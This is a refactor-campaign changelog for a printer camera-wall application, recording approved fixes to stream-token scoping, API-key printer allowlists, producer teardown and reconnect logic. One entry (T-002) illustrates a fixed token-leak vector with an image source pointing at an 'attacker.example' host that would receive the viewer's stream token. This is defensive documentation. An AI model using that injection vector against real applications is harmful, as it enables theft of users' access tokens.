# Baseline Changelog — campaign 22 (camera wall + card hover dwell)

User-approved behavior changes made during the refactor campaign, each an
explicit exception to the campaign's zero-functionality-change rule. Every
entry names the task, what changed, which golden probe(s) / SURFACE.md
sections were re-recorded in the same commit, and the approval date.

Campaign 22 re-baselined this file at setup (2026-09-29). The entries of
campaigns 1–21 live in git history (`git log -p -- BASELINE-CHANGELOG.md`
before the `chore(refactor-loop): setup` commit tagged `refactor-base`) and
in each campaign's archived FINAL_REPORT.md.

## T-001 — create_stream_token refuses printer-restricted API keys (user-approved 2026-09-29)

`POST /api/v1/printers/camera/stream-token` now returns 403 when the caller is
an API key with `printer_ids` set (auth enabled). The minted token carries no
printer allowlist, so such a key previously got a token that opened every
printer's `/camera/stream` and `/camera/snapshot`. JWT users, unrestricted
keys and the auth-disabled path are unchanged. The key is resolved via the
existing `_grid_stream_api_key_if_auth_enabled` dependency.

- Golden probes re-recorded: none (13/13 match; no `responses=` declared, so
  `camera-contract` / `app-openapi-index` are unchanged).
- SURFACE.md sections regenerated: "Route signatures — grid stream, hub
  status, stream token, stream, stop" (new `api_key` parameter on
  `create_stream_token`).

## T-002 — only rewrite same-origin /api/v1/ media srcs with the stream token (user-approved 2026-09-29)

`frontend/src/hooks/useCameraStreamToken.ts` gained a module-private
`isSameOriginApiV1Src(src)` helper (resolves `src` against
`window.location.href`, returns true only when the resolved URL's origin
matches the page's origin and its pathname starts with `/api/v1/`; an
unparseable `src` returns `false` without throwing). It now gates all three
places that append or recognise a stream token on an `<img>`/`<video>` src:
`isCameraUrl` (only classifies a same-origin `/api/v1/` src containing
`/camera/` as a camera URL), `rewriteMediaSrcWithToken` (skips appending
`?token=` to any src that fails the gate), and the capture-phase `load`-error
listener in `useStreamTokenSync` (skips srcs that fail the gate when
deciding whether to retry/clear a token). Relative srcs are unaffected: they
still resolve against `window.location.href` and are rewritten exactly as
before. The commit was flagged by the blind verifier as an observable
behavior change with no changelog entry (at BASE, a cross-origin src such as
`https://attacker.example/api/v1/x` received the viewer's camera or media
token appended as `?token=...`); the user approved it after that flag, on
2026-09-29, as the fix for that disclosure. The risk is real: user-editable
content (e.g. project notes sanitized with DOMPurify, which keeps `<img
src>`) can embed an attacker-controlled `<img src="https://attacker.example/
api/v1/...">`, and before this change the viewer's live token would be
appended to it and sent to that third-party origin on load. What is
unchanged: every URL the app itself constructs for camera/media elements is
relative or already same-origin, so normal camera grids, snapshots, and
media playback still get their token exactly as before; only
attacker-controlled cross-origin srcs stop receiving a token. This addendum
commit is the changelog entry for commit 702605c33 "refactor(loop-1): T-002
only rewrite same-origin /api/v1/ media srcs with the stream token".

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none.

## T-011 — grid-stream answers 503 + Retry-After when the load gate refuses every producer (user-approved 2026-09-29)

`camera_grid_stream` in `backend/app/api/routes/camera.py` now tells apart
the two ways a request can end with no producer. When the requested printers
exist and can stream through the hub (no external camera), but the
spawn-time load gate in `_ensure_producer` refused every one of them, the
route raises `HTTPException(503, "Camera producers temporarily unavailable
(system under load)")` with a `Retry-After: 5` header. The 5 seconds is the
new module constant `_GRID_SPAWN_REFUSED_RETRY_AFTER`, defined next to
`_SPAWN_LOAD_THRESHOLD`. Before this change the route answered
`404 "No valid printers found"`, which the camera wall treats as terminal, so
a wall that connected during a load spike stayed dead until someone pressed
Restart. Unchanged: no printers found, none allowed by an API key's
allowlist, or only external-camera printers still get the same 404; a
request where at least one producer starts still streams as before.
Frontend: no change. `useGridStream.ts` already sends every 5xx through the
existing backoff reconnect path, and its only terminal branch is 4xx other
than 408/429. The existing T-138 hook test "still retries on a 500" covers
that path.

- Golden probes re-recorded: none (13/13 match; no `responses=` declared).
- SURFACE.md sections regenerated: none (route signature unchanged).

## T-003 — grid-stream `?force=true` requires `settings:update` (user-approved 2026-09-29)

`camera_grid_stream` in `backend/app/api/routes/camera.py` now checks, only
when `force` is true, that the caller also holds `Permission.SETTINGS_UPDATE`
(new private helper `_require_grid_stream_force_permission`, called at the
top of the route body). A forced restart tears down the shared ffmpeg
producers every other camera wall and single-camera viewer is watching, so it
is an administrative action; `SETTINGS_UPDATE` was chosen because it is the
permission that changes the camera quality preset (the settings route already
stops every producer on a preset change) and no camera-specific admin
permission exists (`CAMERA_VIEW` is the only camera permission). JWT users
without it get `403 "Missing required permissions: settings:update"`; admins
pass (they hold every permission). API keys go through the normal
`authorize_api_key` gate, where `SETTINGS_UPDATE` is administrative, so any
key with `force=true` gets `403 "API keys cannot be used for administrative
operations"`. Before this change any `camera:view` caller (user or
read-status key) could restart every viewer's producers. Unchanged: requests
without `force` keep exactly the old auth (CAMERA_VIEW + optional API-key
printer allowlist); auth-disabled deployments keep `force` working; the route
signature and OpenAPI are unchanged (runtime check, no new dependency, no
`responses=`). The frontend never sends `force`.

- Golden probes re-recorded: `camera-route-perms` (new line
  `3 Permission.SETTINGS_UPDATE`); the other 12 match.
- SURFACE.md sections regenerated: "Permissions guarding camera routes (count
  per permission)" (same new line).

## T-012 — SharedStreamHub waits for a dying producer's teardown for every caller (user-approved 2026-09-29)

`SharedStreamHub` in `backend/app/api/routes/camera.py` now keeps a private
per-printer teardown record (`self._tearing_down`, filled by the new private
module helper `_track_teardown`, which clears the record from a done-callback
unless a newer teardown replaced it). Every path that detaches a dying entry
under the hub lock records its task there: `get_or_start` (dead entry and
stale-producer branches), `restart` (dead entry, stale same-params and
params-change branches), `stop` and `stop_all`. `_replace_producer` now, after
awaiting its own old task as before, re-checks under the lock and, when no
alive entry exists, waits (outside the lock) for any recorded teardown or for
a dead entry still in `_streams` whose task is running, then re-checks again.
Before this change only the caller that found the dying entry waited; a second
viewer (another camera wall, or a single-camera viewer) arriving during that
wait found no entry and dialed a second ffmpeg/socket on the same camera while
the old teardown was still running. Now it waits for that teardown, bounded by
the existing `_await_displaced_task` timeout (8s, then force-cancel), and then
reuses the single producer the first caller started. Unchanged: producer
parameters, frame delivery, every timeout (8s in `_replace_producer`, 5s in
`stop`/`stop_all`), the hub-status payload shape, the public method names and
return values, the caller's own cancellation still propagating, and the
phase-3 replacement of an alive entry with different params (still cancelled
and replaced without waiting).

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none (private names only).

## T-013 — grid-stream producer restarts run as background tasks (user-approved 2026-09-29)

`camera_grid_stream`'s restart processing in `backend/app/api/routes/camera.py`
(`_process_grid_restarts`) no longer awaits a producer restart inline. Each
due restart is spawned as an `asyncio` task (private `_grid_restart_producer`,
still one fresh `async_session()` per restart) and tracked on the connection's
`_GridConnState.restart_tasks` together with the attempt count and pass time it
was spawned at. A later pass harvests finished tasks (`_harvest_grid_restarts`)
and applies the outcome exactly as the inline code did (`_adopt_grid_restart`):
on success the entry replaces the old one in `entries`/`registered_entries`
with the same viewer-count, `seen_seqs` and `restart_history` bookkeeping; on
failure the same exponential backoff with jitter is scheduled, measured from
the spawning pass. Before this change a restart stuck in `_ensure_producer`
(up to 8s per displaced producer teardown, up to 4 restarts serially) froze
every healthy tile on the wall; now the send loop keeps streaming them and the
restarted tile's frames resume once its task is adopted. A printer whose
restart is in flight stays in `pending_restarts`, is never re-spawned, and a
printer harvested in a pass waits for the next pass before a new attempt.
`_GRID_MAX_CONCURRENT_RESTARTS` (4) now caps the restarts in flight. On
disconnect, `generate()`'s `finally:` runs its synchronous cleanup first: it
cancels every in-flight restart with plain `task.cancel()`
(`_cancel_grid_restarts`), then decrements the viewer count of every entry the
connection registered, as before. Only after that does it await the cancelled
tasks (`asyncio.gather(..., return_exceptions=True)`), on a best-effort basis.
Starlette cancels the response's anyio scope on `http.disconnect`, and that
re-cancels this await, so nothing that matters comes after it. Each cancelled
task unwinds its own `async with async_session()` on its next loop turn, so
the session still closes when the await itself gets cancelled. A restart that
finished but was not yet adopted is discarded without registering a viewer, so
the hub's idle timeout reaps its producer unless another viewer uses it.
Unchanged: the restart budget, backoff math and slow-retry schedule, the
fleet-cooldown circuit breaker, the per-printer cooldown, the log lines, the
quality resolution (same stream count formula), non-forced `_ensure_producer`,
and the viewer-count decrement itself (same code, still guaranteed to run on
disconnect because it happens before any await in `finally:`).

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none (private names only).

## T-016 — grid-stream request times out when response headers never arrive (user-approved 2026-09-29)

`startMultiplexedStream` in `frontend/src/hooks/useGridStream.ts` now arms a
one-shot timer of 45s (module-private `GRID_RESPONSE_HEADERS_TIMEOUT_MS =
45_000`) right before each `fetch` of `/api/v1/printers/camera/grid-stream`,
and clears it in a `finally` as soon as `fetch` resolves or rejects. 45s leaves
15s of headroom over the backend's spawn stagger (up to about 30s on a loaded
30-printer wall, during which the response headers are legitimately held back)
and matches the existing 45s mid-stream stall timer, so the longest silent wait
is the same before and after the body starts. If the timer fires, it sets a
per-attempt `headersTimedOut` flag and calls `abort()` on that attempt's
`AbortController`; the rejected `fetch` (an `AbortError`) then reaches the
existing `catch`, which no longer returns early for an `AbortError` when that
flag is set. It takes the same path as any other stream failure:
`scheduleReconnect(ids)` shows the reconnect overlay and countdown and runs the
exponential backoff, after which a fresh `AbortController` is created and a new
request goes out. Before this change a request with no response headers (for
example a half-open TCP connection after a kiosk's Wi-Fi drop) waited
indefinitely, bounded only by the OS TCP timeout, with frozen frames and no
reconnect overlay. Unchanged: an abort from unmount/effect re-run or
`beforeunload` still ends the loop without reconnecting (the flag is only set
by the timeout); a request that gets its headers within 45s behaves exactly as
before (the timer is cleared before the status check, and the terminal 4xx
handling, the 45s body stall timer, the backoff math and the startup timeout
are untouched). No new export, setting or UI string.

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none (private names only).

## T-017 — connect()'s catch block ignores a superseded attempt's rejection (user-approved 2026-09-30)

Sanctions commit b42fb1570 "refactor(loop-5): T-017 guard connect()'s catch
block against superseded attempts". `connect()` in
`frontend/src/hooks/useWebRTCStream.ts` now hoists its local `pc` out of the
`try` block (declared `let pc: RTCPeerConnection | null = null` before the
`try`, assigned inside it), so the `catch` block can compare it against
`pcRef.current` the same way the existing guard after the `webrtcOffer` await
already does. The `catch` now reads `if (!mountedRef.current ||
pcRef.current !== pc) return;` instead of just `if (!mountedRef.current)
return;`. A superseded attempt's later rejection — for example the grid
Restart button or a suspend/resume changing `restartKey`, or a resume racing
a still-pending `createOffer`/`setLocalDescription`/`webrtcOffer` from before
suspend — used to reach the `catch` after `pcRef.current` had already moved on
to a newer attempt's `pc`, and unconditionally called `setIsLoading(false)`,
`setHasError(true)`, `setIsConnected(false)` and `scheduleReconnectRef`,
tearing down or reconnecting the live connection the newer attempt had
already established. Now that rejection is silently dropped when
`pcRef.current` no longer points at the attempt's own `pc`. Unchanged: the
current (non-superseded) attempt's own rejection still sets the error state,
clears loading/connected, and schedules a reconnect exactly as before (this
is the `pcRef.current === pc` case); and if the `RTCPeerConnection`
constructor itself throws, `connect()` had already called `cleanup()` at its
top, which nulls `pcRef.current`, so the local `pc` (still its initial
`null`) equals `pcRef.current` (`null`) and the old unconditional error path
still runs.

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none (private names only).

## T-018 — attemptReconnect cancels a pending reconnect timer before re-arming (user-approved 2026-09-30)

Sanctions commit 1183d51e0 "refactor(loop-5): T-018 fix attemptReconnect
orphaning a pending reconnect timer". `attemptReconnect` in
`frontend/src/hooks/useStreamReconnect.ts` now clears any pending
`reconnectTimerRef.current` (`clearTimeout` + set to `null`) immediately
before arming the new `setTimeout`, mirroring the cancel-then-restart pattern
already used a few lines above for `cancelCountdownRef.current`. Before this
change, two triggers landing inside the same backoff window (for example the
stall-detection interval and the MJPEG `onError` → `handleStreamError` path
firing close together) overwrote `reconnectTimerRef.current` with the second
timer's handle without clearing the first, so the first `setTimeout` was
still live and unreachable by `clearTimers()`/`reset()`. If `reset()` ran or
the component unmounted before the first timer's original delay elapsed, that
orphaned first timer still fired its own `onReconnect()` afterwards,
restarting an MJPEG fetch nothing had aborted (`CameraPage` /
`EmbeddedCameraViewer` unmount is the caller-facing case). Now the second
trigger's own `setTimeout` is the only one left pending, so
`reset()`/unmount and the existing `clearTimeout` in `clearTimers()` are
guaranteed to cancel it. Unchanged: which trigger wins when two land in the
same window (the second trigger's attempt count, restarted countdown display,
and delay were already what fired, and still are — the only observable
change is that the first timer can no longer also fire); the single-trigger
scheduling path; the exponential backoff schedule and its `maxDelay` clamp;
and everything else `reset()`/unmount already cleared.

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none (private names only).

## T-019 — camera wall recovers from a render error instead of staying on the error text (user-approved 2026-09-29)

Sanctions commit <this commit> "refactor(loop-6): T-019 give the camera wall a
reset path after a render error (user-approved behavior change)". The camera
wall (`pageView === 'camwall'` in `frontend/src/pages/PrintersPage.tsx`) was
wrapped in the shared `components/ErrorBoundary.tsx`, which latches
`hasError: true` with no reset path, so a single transient render exception in
`CameraGrid` or any tile replaced the whole wall with the static
`printers.cameraGridError` text until the page was reloaded — fatal for an
unattended fullscreen kiosk wall. The wall now uses a wall-local boundary
(`CamWallErrorBoundary`, plus its `CamWallErrorFallback`, both private to
`PrintersPage.tsx`). Its fallback still shows the same
`printers.cameraGridError` text in the same `text-center py-8 text-red-400`
block, and adds a countdown line and a Retry button, both reusing existing
keys the tiles already use (`printers.cameraGrid.reconnecting`, "Reconnecting
in {{countdown}}s (attempt {{attempt}})", where attempt is the remount about to
be made; and `printers.cameraGrid.retry`), so no locale file changes. After 20 s the boundary
remounts the wall on its own; Retry remounts it immediately and cancels the
pending auto-retry. Each reset bumps a `key`, so the wall mounts as a fresh
subtree; if it throws again the fallback returns with a fresh 20 s countdown.
Unchanged: the shared `components/ErrorBoundary.tsx` (not touched, so every
other caller keeps its exact props and latching behaviour); `CameraGrid`'s
props and everything the wall renders while healthy; the error text itself;
and the cards view, which never used this boundary.

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none (`bash tools/gen_surface_c22.sh | diff - SURFACE.md` is empty; the boundary is private to PrintersPage.tsx, which the surface only scans for page views, CamWallClock and CameraGrid props).

## T-004 — camera hub-status diagnostics scoped to the API key's printer allowlist (user-approved 2026-09-29)

Sanctions commit <this commit> "refactor(loop-7): T-004 scope camera hub-status
diagnostics to the API key's printer allowlist (user-approved behavior
change)". `GET /camera/hub-status` (`camera_hub_status` in
`backend/app/api/routes/camera.py`) returned every printer's grid producers,
ffmpeg stderr error lines and per-printer status to any caller holding
CAMERA_VIEW, ignoring an API key's `printer_ids` allowlist. The route now
resolves the caller's key through the same `_grid_stream_api_key_if_auth_enabled`
dependency the grid stream and stream-token routes use (new
`api_key: APIKey | None = Depends(_grid_stream_api_key_if_auth_enabled)`
parameter) and, per printer, applies `check_printer_access`. For a key
restricted to a `printer_ids` list, these printer-keyed fields keep only that
key's printers: `grid.producers`, `watchdog_killed_printers`,
`stderr_error_counts`, `stderr_error_details`, `stderr_recent_errors` (keyed by
stream_id `"{printer_id}-…"`; a stream_id whose prefix is not an integer
cannot be mapped to a printer and is hidden from restricted keys only) and
`per_printer_status` (which already folds in `per_printer_cooldown`).
Unchanged: the response shape (same keys and types); hub-wide fields —
`grid.producer_count`, `ffmpeg_processes` (keyed by OS pid and carrying no
printer id, so left unfiltered), `system_load`, `cooldown_active`,
`cooldown_remaining_s`, `watchdog_thresholds`; the CAMERA_VIEW permission
gate; and the full, unfiltered output for JWT users, auth-disabled callers and
global keys (`printer_ids=None`). With auth disabled no key header is read, as
on the grid stream.

- Golden probes re-recorded: none (13/13 match; the new dependency adds no
  OpenAPI parameters beyond the security/X-API-Key ones the route already had).
- SURFACE.md sections regenerated: "Route signatures — grid stream, hub status,
  stream token, stream, stop" (`camera_hub_status` gains the `api_key` line).

## T-026 — webrtc_offer scoped to the API key's printer allowlist (user-approved 2026-10-01)

Sanctions commit <this commit> "refactor(loop-8): T-026 scope webrtc_offer to
the API key's printer allowlist (user-approved behavior change)".
`POST /printers/{printer_id}/camera/webrtc` (`webrtc_offer` in
`backend/app/api/routes/camera.py`) only checked CAMERA_VIEW, so an API key
restricted to a `printer_ids` allowlist got a live WebRTC answer for any
printer. The route keeps its `RequirePermissionIfAuthEnabled(Permission.CAMERA_VIEW)`
gate and gains a second dependency, `__: None = Depends(_require_webrtc_printer_access)`,
which resolves the caller's key through `_grid_stream_api_key_if_auth_enabled`
(the T-004 / grid-stream helper) and applies `check_printer_access(api_key,
printer_id)`. A restricted key (X-API-Key or `Authorization: Bearer bb_…`)
whose allowlist excludes the path's printer now gets 403
"API key does not have access to printer {id}" before go2rtc is touched.
`RequirePrinterPermissionIfAuthEnabled` was deliberately NOT used: it reads
and validates an attached key even when auth is disabled, which would turn
auth-off requests carrying a restricted or stale key into 403/401.
Unchanged: JWT users, global keys (`printer_ids=None`), restricted keys on an
allowed printer, unauthenticated callers (401), auth-disabled callers (no key
header is read), the request/response shape and every 400/404/503 path.

- Golden probes re-recorded: none (13/13 match before and after).
- SURFACE.md sections regenerated: none (`gen_surface_c22.sh` output identical).

## T-027 — params-change replacement waits for the displaced producer's teardown (user-approved 2026-10-01)

Sanctions commit <this commit> "refactor(loop-8): T-027 await the displaced
producer's teardown on a params-change restart (user-approved behavior change)".
In `SharedStreamHub._replace_producer` (`backend/app/api/routes/camera.py`),
the phase-3 branch that finds a concurrently created alive entry which
`reuse_existing` rejects (different params on a `restart()`) still marks it
dead, cancels its task and removes it from `_streams`, but now also records
that task through `_track_teardown(self._tearing_down, ...)` and, when it is
still running, loops back to await it via `_await_displaced_task` (same 8s
bound, then force-cancel) before re-checking under the lock and creating the
new entry. Before this change that branch spawned the new producer at once,
so two ffmpeg/RTSP sessions overlapped on one camera (e.g. two concurrent
forced grid streams resolving different fps/quality), and a third caller
arriving meanwhile did not wait for the displaced task either. Users may see
a concurrent forced quality change take up to 8s longer to start its new
stream. Unchanged: every other detach site and path of the hub, the reuse
rules, producer parameters, frame delivery, every timeout, the `_run_producer`
finally identity check (it never removes the replacement entry), the
hub-status payload, public method names and return values, and the caller's
own cancellation propagating.

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none (`gen_surface_c22.sh` output identical).

## T-054 — the fast lookup path treats a frozen producer as missing (user-approved 2026-10-01)

Sanctions commit <this commit> "refactor(loop-11): T-054 treat a frozen
producer as missing on the fast lookup path (user-approved behavior change)".
`SharedStreamHub.get_existing` (`backend/app/api/routes/camera.py`) now returns
`None` for an alive entry that has produced frames (`frame_seq > 0`) but none
for over `STALE_PRODUCER_TIMEOUT` (45s, per-instance override honored), without
touching the entry. `_ensure_producer`'s non-forced fast path (used by the
single-camera `camera_stream`, the grid's background restart and the grid
spawn loop) therefore falls through to `get_or_start`, whose existing
stale-replacement branch cancels the frozen producer, records its teardown in
`_tearing_down` and starts a new one. Before this change a viewer opening a
camera whose producer had stalled (e.g. a chamber camera whose printer dropped
off the network) was attached to the frozen entry and saw a frozen last frame
or a black tile until the producer gave up on its own. Users may now see other
viewers of that camera briefly interrupted while the shared producer restarts.
The staleness test is one module-private helper, `_producer_is_stale`, now also
used by `get_or_start` and `restart` (same predicate, same constant, same
`frame_seq > 0` guard: a producer still connecting is never stale).
Unchanged: `get_existing_batch` deliberately stays stale-unaware. The grid
stream calls it once at connect time, and its generator loop's own
stuck-producer detection (30s, kills the entry and schedules a restart under the
existing backoff, recovery window and watchdog circuit breaker) handles a
stale entry on its first pass; hiding the entry from the batch would route it
around that backoff instead. Also unchanged: `get_or_start`/`restart`
behavior, the reuse rules, every timeout, `/camera/stop`, hub status payload,
the stream-token route, hub method names and signatures, and frame delivery.

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none (`gen_surface_c22.sh` output identical).
